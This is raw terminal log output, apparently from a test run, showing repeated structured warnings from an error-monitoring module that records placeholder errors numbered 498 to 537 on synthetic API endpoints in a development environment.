WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710725Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 498'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710816Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 499'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710877Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 500'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710931Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 501'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710982Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 502'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711031Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 503'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711080Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 504'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711129Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 505'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711178Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 506'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711227Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 507'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711275Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 508'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711322Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 509'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711370Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 510'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711418Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 511'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711467Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 512'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 513'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711573Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 514'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711624Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 515'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711673Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 516'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711722Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 517'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711772Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 518'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711823Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 519'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711873Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 520'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711923Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 521'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.711972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 522'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712023Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 523'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712073Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 524'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 525'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712171Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 526'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712220Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 527'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712269Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 528'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712317Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 529'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 530'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712415Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 531'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712463Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 532'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712568Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 533'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712639Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 534'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712694Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 535'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712746Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 536'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712796Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 537'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
